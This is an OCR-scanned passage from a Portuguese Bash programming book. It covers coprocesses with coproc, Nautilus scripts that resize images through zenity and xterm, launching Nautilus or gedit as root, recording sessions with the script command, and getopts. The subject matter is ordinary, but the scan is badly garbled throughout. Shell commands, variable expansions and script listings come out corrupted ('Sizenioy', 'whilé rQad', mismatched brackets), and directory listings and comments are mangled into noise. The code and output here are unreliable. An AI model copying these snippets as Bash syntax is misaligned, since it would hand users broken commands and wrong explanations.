trabalha como uma forma muito redundante para listar o diretório corrente. 
Como você pode ver, os named pipes, com uma pequena ajuda do She/1, 
permite que árvores de pipes sejam criadas. As possibilidades são limita-
das apenas pela sua imaginação. 
Co processos 
A partir da versão 4.0, o Bash incorporou o comando coproc . Este novo 
intrínseco (builtin) permite dois processos assíncronos se comunicarem e 
interagirem. Como cita Chet Ramey no Bash FAQ, ver. 4.01: 
"Há uma nova palavra reservada, coproc, que especifica um copro-
cesso: um comando assíncrono que é executado com 2 pipes conec-
Sacos de gatos 
313 
lados ao Shell criador. coproc pode receber nome. Os descritores 
dos arquivos de entrada e saída e o PIO do coprocesso estão dispo-
níveis para o Shell criador em variáveis com nomes especificas do 
cop.roc ." 
George Dimitriu explica: 
" coproc é uma facilidade usada na substituição de processos que 
agora está publicamente disponível." 
A comprovação do que disse Dimitriu não é complicada, quer ver? Veja 
a substituição de processos a seguir: 
$ cat < (echo xxx; s leep 3; echo yyy: s leep 3 ) 
Viu?! O cat não esperou pela conclusão dos comandos entre parênte-
ses, mas foi executado no fim de cada um deles. Isso aconteceu porque 
estabeleceu-se um pipe temporário/d inâmico e os comandos que estavam 
sendo executados mandavam para ele as suas saídas, que por sua vez as 
mandava para a entrada do cat . 
Isso significa que os comandos dessa substituição de processos roda-
ram paralelos, sincronizando somente nas saídas dos echo com a entrada 
do cat . 
A sintaxe de um coprocesso é: 
coproe [ nome] cmd 
redi re ciontune:nto~ 
Isso criará um coprocesso chamado nome . Se nome for informado, cmct 
deverá ser um comando composto. Caso contrário (no caso de n ome não 
ser informado), cmd poderá ser um comando simples ou composto. 
Quando um coproc é executado, ele cria um vetor com o mesmo nome 
nom<> no Shell criador. Sua saída padrão é ligada via um pipe a um descritor de 
arquivo associado â variável s (nome [o 1 1 à entrada padrão do Shell pai (lem-
bra que a entrada padrão de um processo é sempre associada por default 
ao descritor zero?). Da mesma forma, a entrada do coproc é ligada à saída 
padrão do script, via pipe, a um descritor de arquivos chamado s (nome [ 11 1 . 
Assim, simplificando, vemos que o script mandará dados para o coproc 
pela variável s (nome (o J 1 e receberá sua saída em s ( nome ( 11 } . 
~1atcria com d r bs auto a.~s 
314 Programação Shell Linux 
Note que esses pipes serão criados antes dos redirecionamentos es-
pecificados pelo comando, já que eles serão as entradas e saídas do 
coprocesso. 
A partir daqui, vou detalhar rapidamente uns estudos que fiz. Isso con-
tém um pouco de divagações e muita teoria. Se você pular para depois 
desses 1s • s. não perderá nada, mas, se acompanhar, pode ser bom para 
a compreensão do mecanismo do coproc . 
Após colocar um coproc rodando, se ele está associado a um descritor 
de arquivo, vamos ver o que tem ativo no diretório correspondente: 
$ 1s - 1 / dev/ fd 
l <><xr·..;xr"" 1 xoot root 13 2010- 01- 06 09: 31 /dev/fd - > /proc/self/fd 
Hummm, é um link para o /proc/self/tct . . . O que será que tem lá? 
$ ls -1 / proc/ self I fd 
total o 
lna·-----
1 JUlio j ulio 6 ~ 2010-01-06 16: 03 o -> /dev/pcs/0 
1 J;1'1X------
1 julio julio 6 4 2010- 01-06 16: 03 1 - > /dcv/pts/0 
lrwx------ 1 juli o julio 6 4 2010-01-06 16: 03 2 -> /dev/pts/0 
lr-x---- --
l julio julio 64 2010-01-06 16: 03 3 -> / proc/3127/fd 
Epa, que o o. 1 e 2 apontavam para /ctev/pts/0 eu já sabia, pois são 
a entrada padrão, saída padrão e saída de erros padrão apontando para 
o pseudoterminal corrente, mas quem será esse maldito device 3? Veja-
mos: 
s 1& - 1 / proc/$$/fd 
SS É o PID do Shel/ cotrenfe 
total o 
lr- x------ 1 julio julio 64 2010- 01- 06 0!): 31 o - > /dt>v/pts/0 
lt>·r.-:------ 1 julio julio 6 4 ?.010- 01- 06 09: 3'l l -> /de·,/pts /0 
l t i.o!X------ 1 julio julio 6 4 2010-01-06 09: 31 2 - > /de't/pts/0 
ltwx------
julio julJ.o 64 2010-01-06 16: 07 2 55 -> /dov/p ts/0 
l-\·tx---- -- 1 julio julio 64 2010-01-06 16: 07 $4 -> p >pe: [1 6857.1) 
1-\·IX-- ---- 1 julio julJ.o 6 4 2010-01-0~ 16: 07 .>õ -> pipe : [124461 1 
1- \.rx------
1 julio julio 61 20 10·01·06 16: 07 .>8 -> pipe: ( 122927) 
lr-x·----- 1 julio j ulio 6 ·1 2010·01-06 16: 07 59 -> pipe : (168520] 
1- \-IX----- -
1 julio julio 6 ~ 2010-01-06 !6: 07 60 -> pipc : [121302 ] 
lr-x------
1 julio julio 64 2010-01-06 16: 07 61 -> pipe: [124460] 
lr- x------
1 julio julio 64 2010- 01- 06 16: 07 62 - > pipe: r 122926] 
lr- Y.------
t j\lliO julio 64 2010- 01- 0.; 16: 0-/ 63 - > pipe : [ 121301] 
Mate 
com d re l s 
1 • s 
Sacos de gatos 
315 
Epa, aí estão os links apontando para os pipes. Esse monte de arquivo 
de pipe que foi listado deve ser porque estava testando exaustivamente 
essa nova facilidade do Bash. 
Para terminar esta teoria chata, falta dizer que o J?I D do Shell gerado 
para interpretar o coproc pode ser obtido na variável $ nome_ PI o e o coman-
do w<li t pode ser usado para esperar pelo fim do coprocesso. O código de 
retorno do coprocesso ($?1 é o mesmo de cmd . 
Exemplos: 
Vamos começar com o mais simples: um exemplo sem nome e direto no 
prompt: 
$ coproc whilé rQad Entra 
>do 
> echo - a-=- $Entra -=-a-
> done 
[2] 3030 
$ eeho Ol á >&${COPROC[l) ) 
S read - u ${COPROC[0)) Sai 
$ echo $Sai 
-=--=- Olá -=-=-
$ k i ll $COPROC_PID 
coproc ativo 
Manda Olá para a pipe da saída 
Lê do pipe da entrada 
Isso não pode ser esquecido ... 
Como você viu, o vetor coPROC, está associado a dois pipes; o s! coPROC [ 1 1 1 
que contém o endereço do pipe de saída, e por isso a saída do echo esta 
redirecionada para ele e o st co?Roc r o 1 1 que contém o endereço do pipe de 
entrada, e por isso usamos a opção - u do read que lê dados a partir de um 
descritor de arquivo definido, ao invés da entrada padrão. 
Como o coprocesso utilizava a sintaxe sem nome, o padrão do nome do 
Vetor é COI?ROC . 
Só mais uma teoriazinha chata: 
$ echo $(COPROC [@ )} 
59 s q 
Lista todos os elementos do vetor 
Como você viu, s ! coPROC to 1 1 estava usando o pipe apontado por 
/proc/S$/fd/59 e $ (COPROC ( l l I usava /prcc/SS / fd/54 . 
Mate 
com d re l s 
1 ' s 
316 Programação Shell Linux 
Agora chega de teoria mesmo! Vamos usar nome neste mesmo exemplo, 
para ver que pouca coisa muda: 
$ coproc teste ( 
> ~hilo read Entr a 
> do 
> eoho -=-=- $Entra 
> done 
> ) 
(6] 3192 
$ e c ho Olá >&$( t este(l]) 
$ read -u ${teste[O] ) Sa i 
$ echo $Sai 
-=-=- ou -=-=-
$ k i ll Steste_PID 
Nesse momento, é bom mostrar uma coisa interessante: quais são os 
processos em execução? 
$ ps 
'riME 0.10 
PI O TTY 
19 00 pts / 
2S82 p t s/ 
O 00 : 00 : 01 bash 
O 00 : 00 : 00 ps 
Vamos executar 2 coprocessos simultãneos: 
$ coproc nomel 
> while read x 
> do 
> 
echo $x 
> done; } 
( 1] 2883 
$ coproc nome2 
> whilo road y 
> do 
> 
ocho $y 
> done; } 
Somente um Bash em execução 
Coproccsso nomol 
Coprocesso nome2 
bash: avi so : execute_ coproc : cop roc [ 2863 : nome l ] s till exi sts 
(2 ] 2884 
Xiiii! Acho que deu zebra! Mas será que deu mesmo? Repare que além 
do PIO 2 883 de nomel , ele também me devolveu o PIO 2 884 , que deve 
ser de nome2 . Vamos ver o que está acontecendo: 
~1atcria com d r bs auto a.~s 
$ ps 
PI O T'fY 
1900 pt:s/0 
2883 pts/0 
2884 p~; .s /0 
2885 pts /0 
TIME CMD 
00 :00 : 01 bash 
00:00 : 00 bash 
00:00 : 00 bash 
00 : 00 : 00 ps 
Sacos de gatos 
317 
Esse j8 existia 
Esse estil executando nome t 
Esse está executendo nome2 
Parece que foi só um aviso, pois os dois I?IDs informados quando inicia-
mos os dois coprocessos estão ativos. Então vamos testar esses 2 caras: 
$ echo xxxxxxxxx >&${ nomel{~ ] } 
$ e c ho yyyyyyyyy >&${ nome2 [~ )) 
$ r e ad - u ${nomel[O)) Recebe 
$ echo $Recebe 
XX XXXY.XX X 
$ read -u ${nome2[0]) Recebe 
$ echo $ Recebe 
yyyyyyyyy 
$ k i l l $nomel_ PIO 
S k i l1 $noma2_ PIO 
Mandando cadeia para nome t 
Mandando cadeia para nome2 
Mergulhando fundo no nautilus 
O nautilus permite que você crie seus próprios scripts e os incorpore ao 
seu ambiente de forma a facilitar a sua vida. Scripts são tipicamente mais 
simples em operação que extensões do Nautilus e podem ser escritos em 
qualquer linguagem de script que possa ser executada no seu computador. 
Para executar um script, escolha Arquivo ~ Scripts, e então escolha o script 
que você quer executar a partir do submenu. 
Você também pode acessar scripts a partir do menu de contexto, isto é, 
clicando no botão da direita. 
Se você não tiver nenhum script instalado, o menu de scripts não 
aparecerá. 
Instalando scripts do gerenciador de arquivos 
O gerenciador de arquivos inclui uma pasta especial em que você pode ar-
mazenar seus scripts. Todos os arquivos executáveis nessa pasta aparece-
rão no menu scripts (Arquivos ~ Scripts ). Seu caminho completo é $HOHE/ . 
gnome2/nautilus- scr ipts . 
~1atcria com d r bs auto a.~s 
318 Programação Shell Linux 
Para instalar um script, simplesmente copie-o para esta pasta de scripts 
e dê a ele a permissão de execução (chmod +>< <nome do script>) . 
Para visualizar o conteúdo da sua pasta de scripts, se você já tiver scripts 
instalados, escolha Arquivos ~ Scripts ~ Abrir Pasta de Scripts. 
Aparecerá o seguinte diálogo: 
Todos os arquivos executáveis 
desta pasta aparecerão no men u 
Sc.rlpts. 
AD escolher um script no me:nu. este será 
executado com os itens selecionados como entrada. 
L .Q.K 
i) 
Outra forma de visualizar os scripts será navegando até a pasta de 
scripts com o gerenciador de arquivos, se você ainda não tiver quaisquer 
scripts. Pode ser necessário visualizar arquivos ocultos, para isto utilize Ver 
~ Exibir Arquivos Ocultos (até porque se você estiver no seu diretório home 
(-1, sem esta opção ativada, você não verá o diretório . gnome2 1 
Escrevendo scripts do gerenciador de arquivos 
Quando são executados em uma pasta local, os scripts receberão como 
entrada os arquivos selecionados. Quando são executados em uma pasta 
remota (por exemplo uma pasta mostrando conteúdo web ou de FTP), os 
scripts não receberão parâmetros alguns. 
A tabela a seguir mostra as variáveis passadas ao scripts: 
e tamanho da janela atual 
sacos de gatos 
319 
Quando executados a partir de uma pasta local, podemos passar para um 
desses scripts os conteúdos dessas variáveis. Quando executados a partir 
da seleção de arquivo(s) em um computador remoto isso não acontecerá. 
Algumas variáveis do nautilus podem e devem ser usadas, elas são: 
• 
NAUTILUS_SCRIPT_SELECTED_FILE_PATHS- são listados os ar-
quivos com caminhos absolutos e com quebra de linha entre eles. 
Essa é a melhor variável a ser usada, mas ela tem um problema, não 
funciona em arquivos que estejam na área de trabalho e só funciona 
em arquivos locais, ou seja, só funciona em rede smb:/1 se você mon-
tar a pasta da rede usando o mount e o smbfs. 
• 
NAUTILUS_SCRIPT_SELECTED_URIS - a função dessa variável é 
idêntica à anterior, com uma diferença: o caminho gerado é sempre 
no formato file://, smb:/1, ftp://, http:// etc ... , ou seja, ele pode listar 
qualquer localização no computador, rede ou internet, mas tem um 
problema crítico, os acentos e espaços são convertidos em códigos, 
o que impede o seu uso em scripts (nada que não possa ser resolvi-
do por um bom e velho sed filtrando e convertendo para seu valores 
originais). Mas por que mencioná-lo? Porque ele é a melhor opção 
para usar com programas que usem o gnome-vfs, como o gnome-
open, Totem, Rhythmbox, etc. 
• 
NAUTILUS_SCRIPT_CURRENT_URI- esta variável contém a pasta 
atual de execução, equivalente ao comando dirname . Como a pri-
meira variável, essa aqui não funciona na área de trabalho. 
• 
NAUTILUS_SCRIPT_WINDOW_GEOMETRY- esta variável infor-
ma a posição e tamanho da janela do nautilus com a qual foi cha-
mado o script. Se você quiser abrir uma janela de diálogo (com o 
zenity, por exemplo), saberá a posição e o tamanho da janela do 
nautilus para não superpor. A geometria é informada da seguinte 
maneira: 
<larqura>x<altura>+<desloc_horizontal>+<desloc_vertical> 
As definições acima foram inspiradas no excelente artigo do Lincoln Lor-
dello em http://www.vivaolinux.com.br/artigo/Nautilus-Scripts/?pagina=1. 
320 Programação Shell Linux 
Imagine você que, ao listar a variável ~NAUTiws_scRI PT_SE LE:CTED_URis, 
recebi a seguinte cadeia: f•l e :/I / home/j ulio/ • c3~ 81J:ea ~20de ~ 20Trabal ho , 
então tratei de jogá-la em um filtro com sed : 
$ s&d 's/%C3%81/Á/q;sl%201 lq' <<< $NAUTILUS_SCRIPT_ SELECTED_ URIS 
file: I I l home/ julio/Area de Trabalho 
Como um livro não permite que você se afaste muito do assunto, o filtro 
de sed que usei como exemplo só filtrava Ã e espaço em branco, mas se 
você for usar muito esse tipo de conversão, aconselho a escrever um script 
com todas as conversões possíveis e, a cada uRr que você receber, pas-
sar a variável como parâmetro para esse script (fica melhor ainda se esse 
script for incorporado como uma função externa, sendo executado com o 
comando sou rce). 
Uma coisa que descobri por acaso, mas não vi nenhuma literatura a 
respeito, é que se você criar diretórios dentro do $HOH!l/ . g nome2 /nautilus-
scupts e dentro dessa pasta colocar scripts executáveis, esses diretórios 
também aparecerão no menu (Arquivos ~ scripts), ajudando a organizar e 
hierarquizar as suas ferramentas. 
Exemplos de scripts 
Existem 3 tipos de scripts que podem ser executados dentro do nautilus: 
1. Com interface gráfica - Esta é a melhor forma de interagir com o 
nautilus, além de ser a mais elegante. A melhor forma de fazê-lo é 
usando zenity (você precisa conhecer bem esta interface do Shell. É 
muito fácil, simples, elegante e eficiente); 
2. Com interface a caractere sem receber dados externos -Também é 
simples e o Shell sozinho resolve essa parada; 
3. Com interface a caractere recebendo dados externos - Essa é de 
longe a mais chata porque não é óbvia. O problema que surge é em 
abrir um xterm. Demorei muito e fiz muitas tentativas até conseguir. 
Mas depois de descoberto o segredo do sucesso, é só seguir a recei-
ta do bolo e tudo fica fácil. 
Vamos ver alguns exemplos que uso no meu dia a dia: 
Mate 
com d re l s 
l • s 
Com interface gráfica: 
$ cat redimen_zen.sh 
o!/bin/bash 
i Redi mensiona fot os. direto no Naut.il u.s 
IFS=•• 
D IFS passa a ser somen~e o new line 
Tipo=Sizenioy - -list \ 
--titl e "Redirnensiona imagens" \ 
Sacos de gatos 
321 
--text .. Informe se redimensionamento\né percentual ou absoluto" \ 
--tadiolist --col um.n J1arque --column .. Tipo" \ 
t rue Percentual fal s.e P.bsoluto) li exit 1 
if [ $Tipo = Pe r centual ) 
then 
Val=$(zenity --entry \ 
--title "Reditn.ensiona imagens" \ 
--text ''Informe o perce.nt ual de r eduç.ao" \ 
--entr y-text 501 ~ I I exit 1 M Concatenando % em SVal 
el se 
Vala$tzenity --entry \ 
--title "1\edimensiona imagens" \ 
--text " I nforme a l argura final da .imagem" \ 
--entry-text 200)x 11 exit l 
fi 
Va~ · ${zeni cy --list --title "Redimensiona imngens" \ 
--text "Escolha uma das opcões abaixo .. \ 
--~adiolist --height 215 -->tidth 390 --hide- co1umn 2 \ 
--colunm Marque --colurnn " •• 
--colu~"n.Y) Opções \ 
false O "Saída da imagem em outro dirccório" \ 
fa l se l "Saida da imagem com sufixo" \ 
true 2 "Saida da irna9em sobrreqravando a i nicial .. ) 11 exit. 1 
ct~se $Vo!lr in 
0) 
Oi~=$(zenity -- file-selection \ 
-- titlc "Escolha diret6rio" \ 
- - directory) li ex. i t 1 ; ; 
l) Suf=$jzenity --entry \ 
--title " Redimensiona imagens•• \ 
--cext "I nforme o sufixo dos arquivos " \ 
--entr:y-t:ext _ redim) l i exit 1 ; ; 
2) mogrify --resize $Val 
" $Ni\UTI LUS _ SCRIPT_ SELECTED_ FILE_PATHS" 
exit ; i 
~1atcria com d r bs auto a.~s 
322 Programação Shell Linux 
esac 
Arqs• $ (echo "$NAUTILUS_SCRIPT_ SELECTE;D_ FlLE_PATHS" I ;•c - l l 
i No f or a 
~eguir urn echo nu_rnérico a tua l iza 
i + a barrtt d~ progresso c um echo seguido de um 
!'!+ j ogo-da-velha ( !I) acu.-.lizn. o toxt:o do cabeçalho 
for Axq i n $~UTlLUS_SCRIPT_SELECTED_riLE_PATHS 
do 
echo $ ( (++ i • 100 I sArqs}} 
echo "i Redimensionando $(basename $Arq) " 
slecp 3 
if [ $Var - e q O ] 
the n 
conve.rt ''Sluq" - resize SVal u$Di.r/$ {Arq##*/}" 
else 
conver t " SA.rq" - resize SVal "S (ArqH . "/SSuf.S(Arq#' . } " 
fi 
done I zenity --progress \ 
--title "Aguarde . Em redimensionamento" \ 
--auto-close --aut:o-kill 
Com interface a caractere sem receber dados externos: 
$ cat naut root.sh 
#!/ bin/bash 
8 Executa uma sessão de Haut:i lus como root 
•+ o gksudo pa ra pegar rapidamente a senha de root 
!I+ caso o tempo de s udo tenha expi rado . 
f+ O comando executado pelo 9ksudo não p.roduz nada 
~+ istJo foi f eito par a o s udo da l ina .se9uintc ganhar 
~+ o privilôqio de root, sem pedir senha pela 
~+ l inha de com.ando, o que complicari a. 
gksudo - u root - k - m " I nforme suc1 senha" true 
sudo nautilus --no .. desktop SHAUTILUS_ SCRIPT_CURREHT_ URI 
Fui informado que existe um bug reportado sobre uma mensagem de 
warning do nautilus, somente sob o Ubuntu, mas que aparentemente não 
influi na execução da tarefa. Provavelmente quando você ler isso, o bug já 
terá sido consertado, mas, de qualquer forma, vou colocar um outro script 
muito semelhante a este, que é muito útil e está rodando redondinho. 
$ cat gedit_root. sh 
~ ! /bin/bash 
f Executa uma s essão d e gedit como ~oot
. 
~1atcria com d r bs auto a.~s 
i+ o qksudo para pegar tap.ldamente a senha de root 
~+ caso o t.empo de $udo t enh..a expirado. 
i+ o comando execu tad'> pelo gY.sudo nao produz nada . 
!!-+ isso foi feit o para o sudo da l inha sequi n t e 9anhar 
ii+ o pdvj,J.êgi o de root 1 sem peà ir senhn pela 
fi+ linh.;• de c ow.ar.do1 
o q u e 
compl~ca r ia. 
gksudo - u root - k -m "Informe su~1 $enha" t.rue 
sudo 9~d i t $~~UT!LUS_SCRI ?T_S ELECTED_F ILE_PATHS 
Sacos de gatos 
323 
Com interface a caractere recebendo dados externos: 
o!/bin/ba.sh 
Y. col.eta inlor.mdções para fazer redimensionarnento 
M+ de imagens diretamente do nauti lus 
8+ l\ucor : J ulio Neves 
#+ Colc"'lbor<l Ção: Lu1z Carl o s S.ilveiJ::a (aka Dom) 
# Abre um xt:erm para exec utar o programi:! 
j + a s i ntaxe pocle parecer es tr-anha, w.as 
it+ acho que esta ê a melhor forma 
xterm - T "Redimensiona Imagens " - geometry 500x500 - bg darkred - fg l içhtgray 
- f n 
' -de i avu-deJavu sans mono- medium- r - " - "' - " - 4 - •-'- '--- "'- ··-* ' 
- e bash -c 
••sourco < ( tai l -n + 15 $0) .. 
exit. O 
ê##ii~itUI!iiUit·Hêrroguma propriamente dito. 
verde=S (tput sHaf 2; 
tpC~t bold) li Val ores <te!a.tlt em verde 
Norm=$ (tput sgrO) 
~
Restaura c::or 
cl ear 
i* Preparando o basename dos arqu1.vos para l~s t a- los 
for l<rq in "'SNi\lJTI LUS_ SCRIPT_SELECTED_ f'ILE_PATHS" 
do 
done 
echo 08 arquivos a redimens i onar são: 
ec ho ~e e==~=~== ~ ~~====e:=:~== ==== 
col umn -c$ (tput cols.) <(echo " SA.rqs .. ) # Li...st.ando arqs em coluna:! 
read - n l -p " 
ceno? ($(Verde)SS!No rml /nl : • 
( ( SREPLY == (Nn ] ]] H exic l 
echo 
:;ead ·nl -p "Jnfotrne se -tedJ.mens J.-onarr..ento e : 
${Verde)P$ {HormJ -
$ {Verde}P${ NormJercentua l 
Mate 
com d re l s 
1 • s 
324 Programação Shell Linux 
S{VerdeiAS{Norml -
$ {Verde)A$(Nocrn)bsoluto 
••> .. Tipo 
case ${Ti po"' ) in ;t conteudo passa para maiusculc'\ (bash 4 . 0) 
P) ocho crcontual 
r ead - p "I nfo.rm& o percen&ual de reduç.lo: " Val 
g~ep - t.q "(0- 9]+$' <« SVal li ! i SVal n.lo numérico 
tput flash 
tead - nl - p"Pez:eent.U<ll invalido'" 
exit 1 
A) echo bsoJ.uto 
read - p ''Informe a l argur a f inal da ~mage-m: " Val 
grep - Eq ' ' [0-9)+S' <<< SVal I I ! 
t:put. f lt~sh 
read -nl - p"Largux:a invalida" 
cxic l 
•) t.put f l llsh 
esac 
r~ad - nl .. p "Inform.ação inválid a '• 
e :dt l 
.read - nl - p " 
Informe a saida da 1magem que vc deseja : 
${Verde I OS ( Uorml 
sai da 
da 
im,wem 
em outr o 
S !Verde / DS ( llorm) 
iret.õrio 
$!Verde I S$ (Uorm) - sai da ela imagem com S (Verde) SS fNor mJ uf»<o 
S (VerdeiGS ( UormJ -
saida da imagem sobres {Verd e ) GS ( llorm) ravando a 
inicial 
::c> " Saida 
case S{Saida''J in 
D) eeho -e '\OlO~•tro ditet6xio' 
l·ead -p 'In foxme o diretório: ' Ol.r 
! -cl "$Dir " 1 I I 
t.put. F.lash 
read - nl - p '' Diretô:d.o J.nex.istente "' 
exit 1 
S) echo -~ ' \ Ol OSufi xo ' 
Mate • com d rell s 
IM s 
Sacos de gatos 
325 
read -p .. Informe o sufixo dos arquivos ($ {Verde}_redim$ {NormJ> : 
.. suf 
suf•$(Suf : - _redi m} 
G) ocho -o •\OlOSobregravando' 
mogrify - - resize $Val $NAUTILUS_SCRIPT_SELECTED_!'ILE_PATHS 
exit: 
; ; 
') reod -n1 - p "Você devia ter escolhido $(Verde)D$(llorm) , $(Verde) 
S$ (llorm) ou $ (Verde)G$ (Horm)" 
e :-:it 1 
esac 
!FS=' 
• # A variâvel $IFS ficou só com um \n (<ENTER>) 
a Agora vamos redimensionar 
for Al:q i n $11AUTILUS_SCRIPT_ SE:LECTED_ FILE_PATHS 
do 
if ( ${SaidaA~J • O ] 
chen 
conve rt "$Arq" - resize SVal 
"$ Dir/${Azq~# " / )" 
echo "SDir/$ {ArqJft'"' /} " redi mensionado 
else 
convert "$Arq" -resi:ze $Vlll " $ ( Arq%~ . ·}$Suf . $(Arc!lf"'.
} " 
echo "$ {.Fu:q %!! . • ) $Suf . $ {Arqli• . ) •• .redimensionacio 
fi 
clone 
A primeira linha desse código, a que inicializa um xterm, merece uma 
atenção maior porque foi nela que perdi muito tempo para associar o pro-
grama ao terminal. 
Primeiramente, vamos entender as opões do xterm usadas: 
-T 
-geometry 
-bg 
- fg 
- fn 
-c 
Especifica o título da janela do terminal; 
Especifica <largura>x<al tu r a> do terminal; 
Especifica a cor de fundo; 
Especifica a cor dos caracteres; 
Especifica a fonte adotada (use o programa xfontsel para es-
colhê-la); 
Especifica um programa para ser executado na janela. 
~1atcria com d r bs auto a.~s 
326 Programação Shell Linux 
A partir desse ponto é que demorei a descobrir a melhor forma de as-
sociar um programa ao terminal sem ter de criar um segundo script. Achei 
muito pobre a solução de ter um programa que abria o xterm e chamava 
um outro para executar a atividade fim, isto é, redimensionar as imagens. 
Então saiu o finalzinho desta linha, ou seja: 
-e bash -c "source < (tail -n +15 $01 •• 
Nesse trecho, como já vimos, a opção - e comanda a execução de um 
bash -c que, por sua vez, manda executar o comando source (ou ponto ( . l ). 
Como já vimos no capítulo 7, este último comando chama um script externo 
para ser executado no mesmo ambiente do script chamador, isto é, não cria 
um subshell. Como este comando precisa carregar o código de um arquivo, 
optamos por usar o mesmo Shell chamador, a partir da 15" linha ttail +15) 
do programa corrente (sOl . A construção < < .•• J foi usada porque sabemos 
que isso faz uma substituição de processos (veja mais na seção "Substitui-
ção de processos", neste mesmo capítulo), isto é, passa para a execução do 
source a saída do tail vinda de um arquivo temporário l/dev/fd/63J . 
script também é um comando 
Atualmente está sendo dada uma grande tônica na área de segurança. O 
que quero mostrar agora não é sobre segurança propriamente dita, mas 
pode dar uma boa ajuda neste campo. 
Algumas vezes o administrador está desconfiado de alguém ou é obri-
gado a abrir uma conta em seu computador para um consultor externo e, 
ciente de sua responsabilidade, fica preocupado imaginando o que esta 
pessoa pode estar fazendo no seu reinado. 
Se for este o seu caso, existe uma saída simples e rápida para ser imple-
mentada para tirar esta pulga de trás da sua orelha. É o comando script, 
cuja função é colocar tudo o que acontece/aparece na tela em um arquivo. 
Quando você entra com o comando sccipt, recebe como resposta 
script started, file i s typescr ipt para informar que a instrução está em 
execução e a saída da tela está sendo copiada para o arquivo typescript . 
Você ficará monitorando tudo daquela estação até que seja executado um 
comando exit ou um <CTRL>+D (que é representado na tela por um exi t ) 
naquela estação, quando então o arquivo gerado pode ser analisado. 
~1atcria com d r bs auto a.~s 
Veja no exemplo a seguir: 
S script 
S<:ript. se~::ted, file is t.ypesctipt 
$ who 
d244775 pts/ 14 
De c 23 10 : 16 
d216707 pts/1 7 
De c 23 11:09 
d276707 pts/l8 
De c 23 12 : 06 
d276707 pts/0 
De c 23 13: 47 
$ exit 
Script. done, fale is t ypescript 
$ cat typescri pt 
(10 .0 . ll3 .116) 
(10 .0 .132 .90) 
(10 . 0 . 132 .90) 
(10 .0 .132 .90) 
script staree.d Ol'l Fri oec 23 13:51 : 16 2005 
s , ... ho 
d24q775 
pcs/14 
De c 23 10:18 (10 .0.!33 . 116) 
d276707 
pts/17 
De c 23 11:09 (l0 .0 . 13Z .90) 
d216707 
pts/1S 
Oec 23 12:06 ( 10 . o .132. 90) 
d276"107 
pts/ 0 
De c 23 13: q ] 
(10 . 0 .!32. 90) 
$ ex.it 
script clone on Fri Dec 23 13 :51:30 2005 
Sacos de gatos 
327 
Caso seja do seu interesse armazenar esses comandos em um arquivo 
que não seja o typescripc, basta executá-lo especificando o arquivo, da 
seguinte maneira: 
S script arq.cmds 
Suponha que o script esteja sendo automaticamente comandado a 
partir do . bash_prolile e, neste caso, toda vez que o usuário se conectar 
ao computador, o arquivo de saída será zerado e regravado. Para evitar 
que os dados sejam perdidos, use o comando da seguinte maneira: 
S script -a a rq. cmds 
Com o uso da opção -a, o comando anexa ( append) no fim de a rq . cmds 
o conteúdo da nova seção, sem destruir o que os logins anteriores geraram. 
Um outro uso bacana do comando é quando você está no telefone 
dando suporte a um usuário remoto e deseja acompanhar o que ele está 
fazendo. Para podermos fazer isso é necessário usarmos a opção - f 
(f/ush) do comando que manda em tempo real para o arquivo de saída 
Mate 
com d re l s 
1 • s 
328 Programação Shell Linux 
tudo que está ocorrendo na tela do usuário para o qual você está dando 
suporte. Existem duas formas distintas. para pegar, também em tempo 
real, o conteúdo do arquivo que está sendo gerado. A mais simples é 
quando o usuário faz: 
$ $Cript - f 
~rq.~~ds 
E, no seu terminal, você faz: 
$ tail -f arq. cmds 
Na outra forma, usando named pipes, primeiramente você deve criar um 
arquivo desse tipo. E logo após mandar listar seu conteúdo, da seguinte 
forma: 
S mkfifo ptipe 
S cat paipe 
O usuário deve então usar o named pipe paipe corno saída do comando. 
$ script - f paipe 
Fatiando opções 
O comando getopts recupera as opções e seus argumentos de uma lista 
de parâmetros de acordo com a sintaxe, isto é, letras após um sinal de me-
nos c-> seguidas ou não de um argumento; no caso de somente letras elas 
devem ser agrupadas. Você deve usar este comando para "fatiar" opções e 
argumento passados para o seu script. 
Sintaxe: getopts cadeiadeopcoes nome 
A cadeiadeopcoes deve explicitar uma cadeia de caracteres com to-
das as opções reconhecidas pelo script, assim. se o script reconhece 
as opções - a - b e -c, cacteiadeopcoes deve ser abc. Se você deseja 
que uma opção seja seguida por um argumento, ponha dois pontos c: ) 
depois da letra, como em a : bc . Isso diz ao getopts que a opção -a tem 
a forma: 
- a argument:o 
Mate 
com d re l s 
1 • s 
sacos de gatos 
329 
Normalmente, um ou mais espaços em branco separam o parâmetro da 
opção; no entanto, getopts também manipula parâmetros que vêm cola-
dos à opção como em: 
- aargumento 
cadeiadeopcoes não pode conter interrogação (?) . 
O nome constante da linha de sintaxe anterior define uma variável que, 
cada vez que o comando getopts for executado, receberá a próxima opção 
dos parâmetros posicionais e a colocará na variável nome . 
getopts coloca uma interrogação {?l na variável definida em nome se 
ele achar uma opção não definida em cacteiacteopcoes ou se não achar o 
argumento esperado para uma determinada opção. 
Como já sabemos, cada opção passada por uma linha de comandos tem 
um índice numérico, assim, a primeira opção estará contida em $1 , a segunda 
em $2 , e assim por diante. Quando o getopts obtém uma opção, ele arma-
zena o índice do próximo parâmetro a ser processado na variável OPTIND . 
Quando uma opção tem um argumento associado (indicado pelo : na 
cadeiadeopcoes), getopts armazena o argumento na variável OPTARG . Se 
uma opção não possui argumento ou o argumento esperado não foi encon-
trado, a variável OPTARG será "matada" {unsetl. 
O comando encerra sua execução quando: 
Encontra um parâmetro que não começa por menos <->; 
O parâmetro especial -- marca o fim das opções; 
Quando encontra um erro (por exemplo, uma opção não reconhecida). 
Exemplo: o exemplo a seguir é meramente didático, servindo para mostrar, 
em um pequeno fragmento de código, o uso pleno do comando. 
S eat qetoptst.sh 
~!/bin/sh 
J Execute assim : 
• 
i 
getoptst .sh - h 
- ?impressora arql arq2 
• 
• e note que as informaeoes de todas as opcoes sao exibidas 
330 Programação Shell Unux 
' 
i A cadeia ' P:h ' diz que a opcao -P eh uma opcao complexa 
I e requer um argumento, e que h eh uma opcao simples que nao requer 
I argumentos . 
while getopts ' P:h ' OPT_LETRA 
do 
echo "getopts fez a variavel OPT LETRA igual a ' SOPT LETRA'" 
echo " 
OPTARG eh ' $0PTARG'" 
done 
used_up•'expr $0PTIND- 1' 
echo "Dispensando os pr imeiros \SOPTIND- 1 = $used_up argumentos" 
shift Sused_up 
echo "O que sobrou da linha de comandos foi ' $• ' " 
Para entendê-lo melhor, vamos executá-lo como está sugerido em seu 
cabeçalho: 
$ getoptst.sh -h - Pimpressora arql arq2 
getopts fez a variavel OPT_LETRA igual a 'h ' 
OPTARG eh ' ' 
